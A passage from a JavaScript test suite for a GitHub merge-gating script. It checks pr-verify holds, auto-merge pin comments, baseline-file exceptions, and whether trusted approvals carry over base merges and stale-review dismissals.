  assert.match(linkHold({ linked_issues: [{ number: 5 }, { number: 6 }] }, "Closes #5", closes(5), "o/r"), /link changed/);
  assert.match(linkHold(record(5), "Closes #5", { totalCount: 11, nodes: [] }, "o/r"), /closing issues could not be read/);
});

test("changeOf reads a files line with and without its status", () => {
  assert.deepEqual(changeOf(["a.md", null, "modified"]), { path: "a.md", previous: null, status: "modified" });
  assert.deepEqual(changeOf(["b.md", "a.md", "renamed"]), { path: "b.md", previous: "a.md", status: "renamed" });
  assert.deepEqual(changeOf(["b.md", "a.md"]), { path: "b.md", previous: "a.md", status: null });
  assert.deepEqual(changeOf(["a.md"]), { path: "a.md", previous: null, status: null });
  assert.throws(() => changeOf("a.md"), /does not read/);
});

const PASS_RUN = {
  id: 11,
  path: ".github/workflows/pr-verify.yml",
  event: "workflow_run",
  head_branch: "main",
  repository: { full_name: REPO },
  head_repository: { full_name: REPO },
  status: "completed",
  conclusion: "success",
};
const QUEUE_PASS = { name: `pr-verify-99-${HEAD}-pass`, verdict: "pass", runId: 11, run: PASS_RUN };
const QUEUE_LINK = { record: { linked_issues: [{ number: 40 }], spec_kind: "closes" }, closing: { totalCount: 1, nodes: [{ number: 40, repository: { nameWithOwner: REPO } }] } };
const report = (refusal, extra = {}) => ({ refusal, head: HEAD, detail: refusal ? "why" : null, ...extra });
const queued = (evidence, reviews = []) => ci(["docs/a.md"], { reviews, queue: { verdicts: [QUEUE_PASS], link: QUEUE_LINK, evidence } });

test("evidenceHold holds the reader's FAIL classes, an unreadable or too-old pull request, and a refusal it does not know", () => {
  for (const refusal of [null, "verify:missing", "verify:spec-changed", "verify:untrusted-spec"]) {
    assert.equal(evidenceHold(report(refusal), HEAD), null, String(refusal));
  }
  for (const refusal of ["verify:fail", "verify:earlier-fail", "verify:repeated-fail", "verify:unreadable", "verify:too-old", "verify:something-new"]) {
    assert.equal(evidenceHold(report(refusal), HEAD), `pr-verify's reader refuses this head (${refusal}: why)`, refusal);
  }
  assert.equal(evidenceHold(report("verify:fail", { detail: null }), HEAD), "pr-verify's reader refuses this head (verify:fail)");
});

test("evidenceHold holds a report it cannot read, or one for another head", () => {
  const unread = "its pr-verify FAILs could not be read";
  for (const bad of [null, [], "x", {}, { head: HEAD }, { refusal: 1, head: HEAD }, report(null, { head: OLD }), report(null, { head: undefined })]) {
    assert.equal(evidenceHold(bad, HEAD), unread, JSON.stringify(bad));
  }
});

// GitHub turns auto-merge off only on a push by someone without write access,
// so a lane push after enable-auto-merge armed the pull request leaves the
// arm on: the queue holds the pushed head, which the pin does not name.
const pinRow = (sha, at) => ({ id: 3, node_id: "IC_7", user: { login: "melodic-automation-lanes[bot]", id: 9, type: "Bot" }, body: `<!-- babysit-merge-pin sha=${sha} rung=C2 -->\nArmed.`, created_at: at, author_association: "NONE" });
const PIN_HELD = /^::error::#99: its head is not fedcba9876543210fedcba9876543210fedcba98, the head the lanes App pinned when it armed auto-merge, so the arm's checks never judged this head;/m;

test("in the merge queue, a lane push after the arm holds the pushed head the pin does not name", async () => {
  const pushed = await queued(report(null), [pinRow(HEAD, "2026-10-23T09:00:00Z"), pinRow(OLD, "2026-10-23T10:00:00Z")]);
  assert.equal(pushed.code, 1, pushed.out);
  assert.match(pushed.out, PIN_HELD);
  for (const reviews of [[pinRow(OLD, "2026-10-23T09:00:00Z"), pinRow(HEAD, "2026-10-23T10:00:00Z")], []]) {
    const through = await queued(report(null), reviews);
    assert.equal(through.code, 0, through.out);
  }
  const forged = await queued(report(null), [{ ...pinRow(OLD, "2026-10-23T10:00:00Z"), user: { login: "someone", id: 8, type: "User" } }]);
  assert.equal(forged.code, 0, forged.out);
});

test("in the merge queue, a trusted approval of the pushed head lifts the pin hold, and outside the queue it never holds", async () => {
  const lifted = await queued(report(null), [pinRow(OLD, "2026-10-23T10:00:00Z"), approve]);
  assert.equal(lifted.code, 0, lifted.out);
  assert.match(lifted.out, /^#99: no pin hold: owner-person approved this head/m);
  const event = await ci(["docs/a.md"], { reviews: [pinRow(OLD, "2026-10-23T10:00:00Z")] });
  assert.equal(event.code, 0, event.out);
  assert.doesNotMatch(event.out, PIN_HELD);
});

const PIN_EDITED = /^::error::#99: the lanes App's newest pin comment was edited, or its edit time did not read, so the head its arm judged does not read;/m;

test("in the merge queue, an edited pin holds even when it names the head", async () => {
  const pinned = [pinRow(HEAD, "2026-10-23T10:00:00Z")];
  const edited = await ci(["docs/a.md"], { reviews: pinned, options: { node: { lastEditedAt: "2026-10-23T11:00:00Z" } }, queue: { verdicts: [QUEUE_PASS], link: QUEUE_LINK, evidence: report(null) } });
  assert.equal(edited.code, 1, edited.out);
  assert.match(edited.out, PIN_EDITED);
  for (const options of [{ fail: "edited" }, { node: null }, { node: {} }]) {
    const unread = await ci(["docs/a.md"], { reviews: pinned, options, queue: { verdicts: [QUEUE_PASS], link: QUEUE_LINK, evidence: report(null) } });
    assert.equal(unread.code, 1, `${JSON.stringify(options)}: ${unread.out}`);
    assert.match(unread.out, PIN_EDITED);
  }
  const lifted = await ci(["docs/a.md"], { reviews: [...pinned, approve], options: { node: { lastEditedAt: "2026-10-23T11:00:00Z" } }, queue: { verdicts: [QUEUE_PASS], link: QUEUE_LINK, evidence: report(null) } });
  assert.equal(lifted.code, 0, lifted.out);
});

test("pinHold reads the lanes App's newest pin", async () => {
  const items = (...rows) => rows.map((row) => ({ ...fromRest(row), lastEditedAt: null }));
  assert.equal(pinHold(items(), HEAD), null);
  assert.equal(pinHold(items(pinRow(HEAD, "2026-10-23T10:00:00Z")), HEAD), null);
  assert.match(pinHold(items(pinRow(HEAD, "2026-10-23T09:00:00Z"), pinRow(OLD, "2026-10-23T10:00:00Z")), HEAD), /^its head is not fedcba98/);
  const pin = fromRest(pinRow(HEAD, "2026-10-23T10:00:00Z"));
  assert.match(pinHold([{ ...pin, lastEditedAt: "2026-10-23T11:00:00Z" }], HEAD), /^the lanes App's newest pin comment was edited/);
  assert.match(pinHold([pin], HEAD), /^the lanes App's newest pin comment was edited/);
  const asked = [];
  const github = async (method, path, body) => {
    asked.push([method, path, body.query === COMMENT_EDITED_QUERY, body.variables]);
    return { data: { node: { lastEditedAt: null } } };
  };
  const older = { ...fromRest(pinRow(OLD, "2026-10-23T09:00:00Z")), nodeId: "IC_6" };
  const read = await withPinEdit(github, [older, pin]);
  assert.deepEqual(asked, [["POST", "/graphql", true, { id: "IC_7" }]]);
  assert.equal(pinHold(read, HEAD), null);
  assert.equal("lastEditedAt" in read[0], false);
  assert.equal(PIN_RE.exec(`<!-- babysit-merge-pin sha=${HEAD} -->`)[1], HEAD);
});

test("in the merge queue, a reader with no FAIL hold lets a passed head through", async () => {
  const { code, out } = await queued(report(null));
  assert.equal(code, 0, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: the reader allows this head\.$/m);
  assert.match(out, /^#99: no verifier hold: pr-verify passed this head\.$/m);
});

const LANES_USER = { login: "melodic-automation-lanes[bot]", id: 9, type: "Bot" };

test("baselineOnly allows the lanes App's pull request whose files are exactly the configured baseline file", () => {
  const { baselineOnly } = holdsModule;
  assert.equal(baselineOnly(LANES_USER, [BASELINE], 9, BASELINE), true);
  assert.equal(baselineOnly(LANES_USER, [BASELINE], "9", BASELINE), true);
  for (const files of [[BASELINE, "docs/a.md"], ["docs/a.md", BASELINE], [BASELINE, "docs/upstream/old.json"], ["docs/upstream/claude-code.md"], [], null, [BASELINE.toUpperCase()]]) {
    assert.equal(baselineOnly(LANES_USER, files, 9, BASELINE), false, JSON.stringify(files));
  }
  for (const file of [undefined, null, "", 7]) {
    assert.equal(baselineOnly(LANES_USER, [BASELINE], 9, file), false, String(file));
  }
  for (const [author, appId] of [
    [{ ...LANES_USER, type: "User" }, 9],
    [{ ...LANES_USER, login: "melodic-agent[bot]" }, 9],
    [{ ...LANES_USER, id: 10 }, 9],
    [{ login: "owner-person", id: 5, type: "User" }, 9],
    [LANES_USER, undefined],
    [LANES_USER, ""],
    [null, 9],
  ]) {
    assert.equal(baselineOnly(author, [BASELINE], appId, BASELINE), false, JSON.stringify([author, appId]));
  }
});

test("in the merge queue, the lanes App's configured baseline file needs no verifier pass or link", async () => {
  const lanes = { user: LANES_USER };
  const passed = await ci([BASELINE], { body: "No related issue: baseline.", pull: lanes, queue: { verdicts: [], link: { record: null, closing: { totalCount: 0, nodes: [] } }, evidence: report("verify:missing") } });
  assert.equal(passed.code, 0, passed.out);
  assert.match(passed.out, /^#99: no verifier hold: the lanes App's pull request changes only docs\/upstream\/claude-code-native-surfaces\.min\.json \(merge\.baseline-file\)/m);
  assert.match(passed.out, /^#99: no pr-verify FAIL hold: the lanes App's pull request changes only/m);
  for (const [files, pull, baselineFile] of [
    [[BASELINE, "docs/a.md"], lanes, BASELINE],
    [[[BASELINE, "docs/upstream/old.json", "renamed"]], lanes, BASELINE],
    [[BASELINE], { user: { login: "owner-person", id: 5, type: "User" } }, BASELINE],
    [[BASELINE], { user: { ...LANES_USER, id: 10 } }, BASELINE],
    [[BASELINE], undefined, BASELINE],
    [[BASELINE], lanes, null],
    [[BASELINE], lanes, ""],
    [[BASELINE], lanes, "docs/upstream/other.json"],
  ]) {
    const held = await ci(files, { body: "No related issue: baseline.", pull, baselineFile, queue: { verdicts: [], link: { record: null, closing: { totalCount: 0, nodes: [] } }, evidence: report("verify:missing") } });
    assert.equal(held.code, 1, `${JSON.stringify([files, pull, baselineFile])}: ${held.out}`);
    assert.match(held.out, /^::error title=pr-verify hold::#99: pr-verify's reader refuses this head's pass \(verify:missing\)/m);
    assert.doesNotMatch(held.out, /changes only docs\/upstream/);
  }
  const veto = { user: { login: "owner-person", id: 5, type: "User" }, body: "do not merge", created_at: "2026-10-23T11:00:00Z", author_association: "OWNER" };
  const vetoed = await ci([BASELINE], { pull: lanes, reviews: [veto], queue: { verdicts: [], link: { record: null, closing: { totalCount: 0, nodes: [] } }, evidence: report(null) } });
  assert.equal(vetoed.code, 1, vetoed.out);
  assert.doesNotMatch(vetoed.out, /no member veto/);
});

test("in the merge queue, a pass the linked issue changed after holds until pr-verify judges the head again", async () => {
  const { code, out } = await queued(report("verify:spec-changed"));
  assert.equal(code, 1, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: the reader refuses this head only on its pass \(verify:spec-changed\)\.$/m);
  assert.match(out, /#99: pr-verify's pass on this head is stale \(verify:spec-changed\): its linked issue changed after pr-verify judged it; wait for pr-verify to pass it/);
  for (const refusal of ["verify:missing", "verify:untrusted-spec"]) {
    const read = await queued(report(refusal));
    assert.equal(read.code, 0, `${refusal}: ${read.out}`);
  }
});

test("in the merge queue, a pass refusal with no pass names read holds on that refusal, not on a missing pass", async () => {
  const refused = await ci(["docs/a.md"], { queue: { verdicts: [], link: QUEUE_LINK, evidence: report("verify:untrusted-spec") } });
  assert.equal(refused.code, 1, refused.out);
  assert.match(refused.out, /#99: pr-verify's reader refuses this head's pass \(verify:untrusted-spec\); wait for pr-verify to pass it/);
  assert.doesNotMatch(refused.out, /pr-verify has not passed this head/);
  const stale = await ci(["docs/a.md"], { queue: { verdicts: [], link: QUEUE_LINK, evidence: report("verify:spec-changed") } });
  assert.match(stale.out, /pr-verify's pass on this head is stale \(verify:spec-changed\)/);
  for (const evidence of [report(null), report("verify:spec-changed", { head: OLD }), report("verify:fail")]) {
    const missing = await ci(["docs/a.md"], { queue: { verdicts: [], link: QUEUE_LINK, evidence } });
    assert.equal(missing.code, 1, missing.out);
    assert.match(missing.out, /pr-verify has not passed this head/);
    assert.doesNotMatch(missing.out, /refuses this head's pass/);
  }
  assert.equal(passRefusalOf(report("verify:missing"), HEAD), "verify:missing");
  assert.equal(passRefusalOf(report("verify:fail"), HEAD), null);
  assert.equal(passRefusalOf(report(null), HEAD), null);
  assert.equal(passRefusalOf(null, HEAD), null);
});

test("in the merge queue, a FAIL the reader counts holds a passed head", async () => {
  const { code, out } = await queued(report("verify:fail", { detail: "fails at the head" }));
  assert.equal(code, 1, out);
  assert.match(out, /::error title=pr-verify hold::#99: pr-verify's reader refuses this head \(verify:fail: fails at the head\); push a new head/);
  assert.doesNotMatch(out, /no pr-verify FAIL hold/);
  assert.doesNotMatch(out, /^::error::/m);
  assert.match(out, /^#99: no member veto and no hold path\.$/m);
});

test("in the merge queue, the reader's verify:unreadable is a pr-verify hold beside a body hold", async () => {
  const { code, out } = await queued(report("verify:unreadable", { detail: "1 whole listing never held" }));
  assert.equal(code, 1, out);
  assert.match(out, /^::error title=pr-verify hold::#99: pr-verify's reader refuses this head \(verify:unreadable: 1 whole listing never held\)/m);
  assert.doesNotMatch(out, /^::error::/m);
});

test("in the merge queue, a trusted approval of the head lifts a FAIL hold", async () => {
  const { code, out } = await queued(report("verify:repeated-fail"), [approve]);
  assert.equal(code, 0, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: owner-person approved this head, which lifts 'pr-verify's reader refuses this head \(verify:repeated-fail: why\)'\.$/m);
});

test("in the merge queue, an approval of another head lifts no FAIL hold", async () => {
  const { code, out } = await queued(report("verify:earlier-fail"), [{ ...approve, commit_id: OLD }]);
  assert.equal(code, 1, out);
  assert.match(out, /verify:earlier-fail/);
});

test("in the merge queue, a missing or unreadable reader report holds", async () => {
  for (const evidence of [undefined, "", "not json", JSON.stringify(report(null, { head: OLD }))]) {
    const { code, out } = await queued(evidence);
    assert.equal(code, 1, `${evidence}: ${out}`);
    assert.match(out, /::error title=pr-verify hold::#99: its pr-verify FAILs could not be read/, String(evidence));
  }
});

// A hold path's approval survives a base merge (the churn measured on
// #10224): a trusted person's approving review of a head lifts a later head
// only when every commit since is a merge of commits the base holds
// (baseMergesOnly) and the net change against the base's tip is the same
// over every file (sameNetChange), or the merges brought exactly the base's
// changes (exactBaseCarry). The base is read once by its full ref (baseTip),
// and every compare against it names its tip commit. A label removal never
// lifts a hold path, and a dismissed approval counts only when GitHub
// dismissed it as stale on a base merge's push. Every adversarial shape
// keeps the hold.
const HELD = ".github/actions/resolve-config/live-config.test.mjs";
const HELD_PATCH = { filename: HELD, status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
const OTHER_HELD = { filename: ".github/actions/resolve-config/resolve.test.mjs", status: "modified", patch: "@@ -1 +1 @@\n-c\n+d" };
const HELPER = { filename: "scripts/helper.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" };
const APPROVED_AT = "2026-10-27T23:26:14Z";
const OTHER = "7".repeat(40);
const TIP = "3".repeat(40);
const review = (state, commit, at = APPROVED_AT, id = 5, type = "User") => ({ id: 41, user: { login: id === 5 ? "owner-person" : "someone", id, type }, state, commit_id: commit, submitted_at: at });
const MB_OLD = "1".repeat(40);
const MB_HEAD = "2".repeat(40);
const merged = (files) => ({ files, merge_base_commit: { sha: MB_HEAD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }], total_commits: 2 });
const atOld = (files = [HELD_PATCH]) => ({ files, merge_base_commit: { sha: MB_OLD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 });
const BASE_DOC = { filename: "docs/base.md", status: "modified", patch: "@@ -1 +1 @@\n-p\n+q" };
const brought = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MAIN }, { sha: HEAD }], total_commits: 2, ...extra });
const baseRange = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MB_HEAD }], total_commits: 1, ...extra });
const ranges = (merges = brought(), based = baseRange()) => ({ [`${OLD}...${HEAD}`]: merges, [`${MB_OLD}...${MB_HEAD}`]: based });
const UNGATED_CARRIES = new Set([
  "a base that changed a file the merges did not bring",
  "a crafted merge whose second parent the base does not hold",
  "a history longer than the compare lists",
  "a merge after which the base holds one of the approved head's files",
  "a merge of a branch other than the base",
  "a merge whose parents are not commit objects",
  "a non-merge commit after the approval",
]);
const treeOf = (entries, extra = {}) => ({ truncated: false, tree: entries.map(([path, mode = "100644"]) => ({ path, mode, type: "blob", sha: "b".repeat(40) })), ...extra });
const FILES_AT = [["docs/base.md"], [".github/actions/collect-base-activity/collect-base-activity.test.mjs"], [".github/actions/resolve-config/live-config.test.mjs"], ["scripts/helper.sh"], ["scripts/lib.mjs"]];
const trees = (head = treeOf(FILES_AT), base = treeOf(FILES_AT)) => ({ [HEAD]: head, [MB_HEAD]: base });
const liftWorld = ({
  reviews = [review("APPROVED", OLD)],
  compares = { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
  across = ranges(),
  modes = trees(),
  base = "main",
  defaultBranch = "main",
  fork = false,
  timeline = [],
  bases = { [MAIN]: "ahead" },
  tip = TIP,
  changed = null,
  events = [],
  activity = [push(HEAD, "2026-10-27T23:32:00Z"), push(OLD, "2026-10-27T23:00:00Z")],
  fail = "",
  diffs = {},
} = {}) => {
  const reads = [];
  const github = async (method, path, body, headers = {}) => {
    reads.push(headers.Accept === DIFF ? `diff ${path}` : path);
    assert.equal(method, "GET");
    if (fail && path.includes(fail)) throw new Error(`${fail} failed`);
    if (headers.Accept === DIFF) {
      const head = new RegExp(`^/repos/owner/repo/compare/${TIP}\\.\\.\\.([0-9a-f]{40})$`).exec(path)?.[1];
      if (head in diffs) return diffs[head];
      throw new Error(`unexpected diff read ${path}`);
    }
    if (path === "/repos/owner/repo/pulls/99") return { head: { sha: HEAD, ref: "fix/cost", repo: { full_name: fork ? "someone/repo" : REPO } }, base: { ref: base }, changed_files: changed ?? compares[HEAD]?.files?.length };
    if (path === "/repos/owner/repo") {
      if (defaultBranch === null) throw new Error("the repository did not read");
      return { full_name: REPO, default_branch: defaultBranch };
    }
    if (path === `/repos/owner/repo/git/ref/heads/${base}`) return { ref: `refs/heads/${base}`, object: { type: "commit", sha: tip } };
    const tree = /^\/repos\/owner\/repo\/git\/trees\/([0-9a-f]{40})\?recursive=1$/.exec(path);
    if (tree && tree[1] in modes) return modes[tree[1]];
    if (path.startsWith("/repos/owner/repo/pulls/99/reviews?")) return path.endsWith("page=1") ? reviews : [];
    if (path.startsWith("/repos/owner/repo/issues/99/events?")) return path.endsWith("page=1") ? events : [];
    if (path.startsWith("/repos/owner/repo/issues/99/timeline?")) return path.endsWith("page=1") ? timeline : [];
    if (path === "/repos/owner/repo/activity?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100") return activity;
    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
    if (parent) return { status: bases[parent[1]] ?? "diverged" };
    const compare = new RegExp(`^/repos/owner/repo/compare/${TIP}\\.\\.\\.([0-9a-f]{40})$`).exec(path);
    if (compare && compare[1] in compares) return compares[compare[1]];
    const range = /^\/repos\/owner\/repo\/compare\/([0-9a-f]{40}\.\.\.[0-9a-f]{40})$/.exec(path);
    if (range && range[1] in across) return across[range[1]];
    throw new Error(`unexpected read ${path}`);
  };
  return { github, reads };
};
async function lifting(world, { files = [HELD], reviews = [], queue = false } = {}) {
  const dir = tempDir("merge-holds-lift-");
  writeFileSync(join(dir, "body"), "Closes #40");
  writeFileSync(join(dir, "discussion"), reviews.map((row) => JSON.stringify(row)).join("\n"));
  writeFileSync(join(dir, "actors"), JSON.stringify({ actors: [{ kind: "human", login: "owner-person", id: 5 }] }));
  writeFileSync(join(dir, "files"), files.map((path) => JSON.stringify([path])).join("\n"));
  writeFileSync(join(dir, "denied"), "[]");
  const argv = ["99", ...["body", "discussion", "files", "denied", "actors"].map((name) => join(dir, name)), HEAD];
  if (queue) {
    writeFileSync(join(dir, "verdicts"), "");
    writeFileSync(join(dir, "link"), "null");
    argv.push(join(dir, "verdicts"), join(dir, "link"));
  }
  const lines = [];
  const log = console.log;
  console.log = (line) => lines.push(line);
  try {
    const code = await main(argv, { env: { GITHUB_REPOSITORY: REPO, BASE_SHA: BASE }, github: world.github });
    return { code, out: lines.join("\n") };
  } finally {
    console.log = log;
  }
}
const HOLD_REASON = /it changes \.github\/actions\/resolve-config\/live-config\.test\.mjs, a hold path; an approving review of this head by a person on the trusted-actor list lifts it/;

test("an approval of an earlier head lifts a hold path over a later base merge, read against the base's tip commit", async () => {
  for (const [name, compares] of Object.entries({
    "a base merge": { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
    "a base merge with a non-hold file in the net change": { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELPER, HELD_PATCH]) },
  })) {
    const world = liftWorld({ compares });
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
    assert.equal(world.reads.filter((path) => path.includes("/git/ref/")).length, 1, name);
    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${TIP}...${OLD}`) && world.reads.includes(`/repos/owner/repo/compare/${MAIN}...${TIP}`), world.reads.join(" "));
    assert.ok(!world.reads.some((path) => /\/compare\/(main\.\.\.|.*\.\.\.main$)/.test(path)), world.reads.join(" "));
  }
});

test("an approval carries over a base merge whose compares list 300 files, judged on their two diffs", async () => {
  const humans = new Set([5]);
  const capped = (diffs) => liftWorld({ compares: { [OLD]: atOld(LISTED.files), [HEAD]: merged(LISTED.files) }, across: {}, changed: 301, diffs });
  const same = capped({ [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT });
  assert.deepEqual(await holdsModule.liftersOf(same.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: ["owner-person"] });
  assert.ok(same.reads.includes(`diff /repos/owner/repo/compare/${TIP}...${OLD}`) && same.reads.includes(`diff /repos/owner/repo/compare/${TIP}...${HEAD}`), same.reads.join(" "));
  const evil = capped({ [OLD]: DIFF_TEXT, [HEAD]: bumped(DIFF_TEXT) });
  assert.deepEqual(await holdsModule.liftersOf(evil.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: [] }, "a merge that changes one line");
  const short = liftWorld({ compares: { [OLD]: atOld(LISTED.files), [HEAD]: merged(LISTED.files) }, across: {}, changed: 302, diffs: { [OLD]: DIFF_TEXT, [HEAD]: DIFF_TEXT } });
  assert.deepEqual(await holdsModule.liftersOf(short.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: [] }, "a diff naming fewer files than the pull request changes");
});

test("liftersOf takes main's tip the caller already resolved, and reads it only for another base or no tip", async () => {
  const humans = new Set([5]);
  const tipReads = (world) => world.reads.filter((path) => path.includes("/git/ref/")).length;
  const given = liftWorld({});
  assert.deepEqual(await holdsModule.liftersOf(given.github, REPO, 99, HEAD, humans, undefined, { mainTip: TIP }), { lifters: ["owner-person"] });
  assert.equal(tipReads(given), 0, "no REST read of main's tip when the caller passed it in");
  assert.ok(given.reads.includes(`/repos/owner/repo/compare/${TIP}...${OLD}`), given.reads.join(" "));
  for (const [name, world, mainTip] of [
    ["no tip", liftWorld({}), undefined],
    ["a tip that is not a commit SHA", liftWorld({}), "main"],
    ["a base other than main", liftWorld({ base: "release", defaultBranch: "release" }), TIP],
  ]) {
    assert.deepEqual(await holdsModule.liftersOf(world.github, REPO, 99, HEAD, humans, undefined, { mainTip }), { lifters: ["owner-person"] }, name);
    assert.equal(tipReads(world), 1, `${name}: one read of the base's tip`);
  }
});

// The owner's decision on #10596: a trusted person's label removal lifts no
// hold path, at the head or before a base merge, and a dismissed approval
// never counts, even one GitHub dismissed as stale on a push. The lanes App
// put the label on at 23:05; the person removed it at 23:26:14.
const LABEL = (event, at, id, login, app = null) => ({ event, label: { name: "needs-human" }, actor: { id, login }, performed_via_github_app: app, created_at: at });
const REMOVAL = [LABEL("labeled", "2026-10-27T23:05:00Z", 2, "lanes[bot]", { slug: "lanes" }), LABEL("unlabeled", APPROVED_AT, 5, "owner-person")];
// GitHub's own stale-review dismissal on the base merge's push, as #10224's
// timeline shows it: the pushing App as actor, no message, the pushed commit.
const STALE = {
  event: "review_dismissed",
  actor: { id: 2, login: "lanes[bot]", type: "Bot" },
  created_at: "2026-10-27T23:32:35Z",
  dismissed_review: { review_id: 41, state: "approved", dismissal_message: null, dismissal_commit_id: HEAD },
};
const stale = (change = {}, actor = {}) => ({ ...STALE, actor: { ...STALE.actor, ...actor }, dismissed_review: { ...STALE.dismissed_review, ...change } });
const DISMISSED_OLD = review("DISMISSED", OLD, "2026-10-27T23:31:57Z");
test("a label removal lifts no hold path", async () => {
  for (const [name, options] of Object.entries({
    "a removal before a base merge": { reviews: [], events: REMOVAL },
    "a removal while this is the head": { reviews: [], events: REMOVAL, activity: [push(HEAD, "2026-10-27T23:00:00Z")] },
    "a removal beside an approval dismissed by a person": { reviews: [DISMISSED_OLD], events: REMOVAL, timeline: [stale({ dismissal_message: "stale" }, { type: "User" })] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
    assert.ok(!world.reads.some((path) => /\/(events|activity)\?/.test(path) || path.includes("/contents/.work-item")), `${name}: ${world.reads.join(" ")}`);
  }
});

test("an approval GitHub dismissed as stale on a base merge's push carries", async () => {
  for (const [name, options] of Object.entries({
    "the same net change": { reviews: [DISMISSED_OLD], timeline: [STALE] },
    "beside a label removal": { reviews: [DISMISSED_OLD], timeline: [STALE], events: REMOVAL },
    "a timeline review id read as a string": { reviews: [DISMISSED_OLD], timeline: [stale({ review_id: "41" })] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
    assert.ok(world.reads.some((path) => path.startsWith("/repos/owner/repo/issues/99/timeline?")), name);
  }
});

test("a dismissal with a message, by a person, or not by the push the carry checks revokes the approval", async () => {
  for (const [name, options] of Object.entries({
    "a dismissal with a message": { timeline: [stale({ dismissal_message: "stale" })] },
    "an empty message": { timeline: [stale({ dismissal_message: "" })] },
    "no message field": { timeline: [{ ...STALE, dismissed_review: { review_id: 41, state: "approved", dismissal_commit_id: HEAD } }] },
    "a dismissal by a person": { timeline: [stale({}, { type: "User" })] },
    "a dismissal with no actor": { timeline: [{ ...STALE, actor: null }] },
    "a dismissed request for changes": { timeline: [stale({ state: "changes_requested" })] },
    "a dismissal of another review": { timeline: [stale({ review_id: 42 })] },
    "a second dismissal event with a message": { timeline: [STALE, stale({ dismissal_message: "no" }, { type: "User" })] },
    "a dismissal commit the merges did not push": { timeline: [stale({ dismissal_commit_id: OTHER })] },
    "the approved head as the dismissal commit": { timeline: [stale({ dismissal_commit_id: OLD })] },
    "a dismissal commit that is no sha": { timeline: [stale({ dismissal_commit_id: null })] },
    "no dismissal event": { timeline: [] },
    "an unreadable timeline": { timeline: [STALE], fail: "/timeline?" },
    "a dismissed approval of the head itself": { reviews: [review("DISMISSED", HEAD, "2026-10-27T23:31:57Z")], timeline: [stale()] },
    "a request for changes after the dismissed approval": { reviews: [DISMISSED_OLD, { ...review("CHANGES_REQUESTED", HEAD, "2026-10-27T23:40:00Z"), id: 43 }], timeline: [STALE] },
    "a dismissed approval by a person off the trusted-actor list": { reviews: [review("DISMISSED", OLD, APPROVED_AT, 77)], timeline: [STALE] },
    "a merge that also edits a file": { timeline: [STALE], compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "+evil" }]) }, across: ranges(brought([BASE_DOC, { ...HELPER, patch: "+evil" }])) },
  })) {
    const run = await lifting(liftWorld({ reviews: [DISMISSED_OLD], ...options }));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

// The owner's decision of 2026-10-28 (part b): when the net change differs
// because the base changed a file the pull request also changes (#10224's
// shape), the approval carries only when what the merges brought into the
// approved head (OLD...HEAD) is, file for file, what the base changed between
// the two merge bases (MB_OLD...MB_HEAD): identical status and patch.
// #10224's own patches: the pull request's hunks sit lower in the shared
// file, so the base's hunk applies with the same header and context.
const SHARED_AT_OLD = { filename: ".github/actions/collect-base-activity/collect-base-activity.test.mjs", status: "modified", patch: "@@ -93,6 +93,13 @@ let root;\n context\n+mine" };
const SHARED_AT_HEAD = { ...SHARED_AT_OLD, patch: "@@ -98,6 +98,13 @@ let root;\n context\n+mine" };
const SHARED_BASE = { filename: SHARED_AT_OLD.filename, status: "modified", patch: "@@ -10,6 +10,11 @@ import\n+theirs" };
const REPLAY = { compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) }, across: ranges(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])) };
test("#10224's shape carries when the merges brought exactly the base's changes", async () => {
  for (const [name, options] of Object.entries({
    "an approval standing at the earlier head": REPLAY,
    "an approval GitHub dismissed as stale": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [STALE] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /which lifts its hold path/, name);
    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${OLD}...${HEAD}`) && world.reads.includes(`/repos/owner/repo/compare/${MB_OLD}...${MB_HEAD}`), world.reads.join(" "));
  }
  const world = liftWorld();
  assert.equal((await lifting(world)).code, 0);
